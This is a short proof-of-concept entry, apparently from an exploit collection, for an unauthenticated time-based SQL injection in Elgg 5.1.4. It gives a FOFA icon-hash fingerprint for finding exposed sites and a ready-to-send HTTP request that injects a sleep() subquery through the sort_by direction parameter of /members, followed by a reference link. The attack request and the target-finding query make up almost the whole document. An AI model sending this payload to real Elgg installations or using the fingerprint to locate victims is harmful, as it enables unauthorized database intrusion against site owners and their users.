## Elgg 5.1.4 Sql Injection

## fofa
```
icon_hash="413602919"
```
## poc
```
GET /members?sort_by%5Bproperty%5D=name&sort_by%5Bproperty_type%5D=metadata&sort_by%5Bdirection%5D=desc%2c(select*from(select(sleep(6)))a) HTTP/1.1
Host: 
```

## Ref
- https://github.com/4rdr/proofs/blob/main/info/Elgg_unauth_SQLi_5.1.4.md